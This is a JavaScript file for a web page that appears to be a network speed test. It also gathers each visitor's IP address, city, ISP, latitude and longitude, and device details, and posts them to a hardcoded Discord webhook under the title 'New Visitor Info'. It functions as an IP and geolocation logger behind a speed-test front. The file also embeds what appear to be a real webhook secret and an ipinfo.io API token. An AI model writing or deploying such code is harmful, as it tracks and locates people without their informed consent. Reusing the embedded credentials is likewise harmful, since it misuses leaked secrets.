
// --- CONFIG ---
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1415394791654428856/0uncp10Lr772qmkanZ4aKAGYo63UdG9XnW32s0UA2CrXXx8ZiubzteQiBxxAgVrAvoTg";
const IPINFO_TOKEN = "3993cbc08215b2"; // replace with your ipinfo.io token

// --- utility ---
function safeStringify(obj) {
  try { return JSON.stringify(obj, null, 2); } catch (e) { return String(obj); }
}
const statusEl = () => document.getElementById('status');
const outputEl = () => document.getElementById('output');
const spinner = () => document.getElementById('spinner');
const btn = document.getElementById('logBtn');

function showSpinner(show) {
  spinner().style.display = show ? 'block' : 'none';
}

// Collect client info + device details
function collectClientInfo() {
  const client = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent || null,
    language: navigator.language || null,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    screen: (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null,
    platform: navigator.platform || null,
    deviceMemory: navigator.deviceMemory || "unknown",
    cpuCores: navigator.hardwareConcurrency || "unknown",
    touchSupport: navigator.maxTouchPoints || 0
  };
  if (navigator.userAgentData) {
    client.userAgentData = {
      mobile: navigator.userAgentData.mobile,
      brands: navigator.userAgentData.brands
    };
  }
  return client;
}

// Fetch IP + geolocation from ipinfo.io with fallback
async function fetchGeo() {
  try {
    const url = `https://ipinfo.io/json?token=${IPINFO_TOKEN}`;
    const res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('Geo API error: ' + res.status);
    return await res.json();
  } catch (err) {
    console.warn("Geo fetch failed:", err.message);
    return { ip: "unknown", city: "unknown", region: "unknown", country: "unknown", loc: null, org: "unknown" };
  }
}

// --- Network tests ---
async function testPing() {
  try {
    const url = "https://www.cloudflare.com/cdn-cgi/trace";
    const attempts = 3;
    let times = [];
    for (let i = 0; i < attempts; i++) {
      const start = performance.now();
      await fetch(url, { cache: "no-store" });
      times.push(performance.now() - start);
    }
    const avg = times.reduce((a,b) => a+b,0) / times.length;
    return Math.round(avg);
  } catch (e) {
    console.warn("Ping failed:", e.message);
    return "n/a";
  }
}

async function testDownload() {
  try {
    const url = "./testfile.bin"; // local file hosted in repo
    const start = performance.now();
    const res = await fetch(url, { cache: "no-store" });
    if (!res.ok) throw new Error("Download failed: " + res.status);
    const blob = await res.blob();
    const end = performance.now();
    const seconds = (end - start) / 1000;
    const mbps = (blob.size * 8 / 1_000_000) / seconds;
    return mbps.toFixed(2);
  } catch (err) {
    console.warn("Download test failed:", err.message);
    return "n/a";
  }
}

// Send results to Discord
async function sendToDiscord(payload) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('XXXX')) {
    console.warn('Webhook not set, skipping.');
    return { skipped: true };
  }
  try {
    const body = {
      content: '```json\n' + safeStringify(payload) + '\n```',
      embeds: [{
        title: 'New Visitor Info',
        color: 3447003,
        fields: [
          { name: 'IP', value: payload.ip || 'n/a', inline: true },
          { name: 'Country', value: payload.country || 'n/a', inline: true },
          { name: 'City', value: payload.city || 'n/a', inline: true },
          { name: 'Ping (ms)', value: String(payload.ping || 'n/a'), inline: true },
          { name: 'Download (Mbps)', value: String(payload.downloadMbps || 'n/a'), inline: true },
          { name: 'Device RAM (GB)', value: String(payload.deviceMemory || 'n/a'), inline: true },
          { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    if (!res.ok) throw new Error('Webhook returned ' + res.status);
    return { success: true };
  } catch (err) {
    console.warn("Discord failed:", err.message);
    return { success: false };
  }
}

// --- Main flow ---
btn.addEventListener('click', async () => {
  btn.disabled = true;
  showSpinner(true);
  statusEl().textContent = 'Collecting...';

  const full = collectClientInfo();

  // GEO
  statusEl().textContent = 'Fetching IP & geo...';
  const geo = await fetchGeo();
  Object.assign(full, {
    ip: geo.ip || "unknown",
    city: geo.city || "unknown",
    region: geo.region || "unknown",
    country: geo.country || "unknown",
    isp: geo.org || "unknown"
  });
  if (geo.loc) {
    const [lat, lon] = geo.loc.split(",");
    full.latitude = lat;
    full.longitude = lon;
  }

  // PING
  statusEl().textContent = 'Testing ping...';
  full.ping = await testPing();

  // DOWNLOAD
  statusEl().textContent = 'Testing download speed...';
  full.downloadMbps = await testDownload();

  // Show results immediately
  outputEl().textContent = safeStringify(full);

  // Send to Discord (optional)
  statusEl().textContent = 'Sending to Discord...';
  const sendRes = await sendToDiscord(full);
  if (sendRes.skipped) {
    statusEl().textContent = 'Done — webhook not set.';
  } else if (sendRes.success) {
    statusEl().textContent = 'Done — sent to Discord.';
  } else {
    statusEl().textContent = 'Done — Discord send failed.';
  }

  btn.disabled = false;
  showSpinner(false);
});
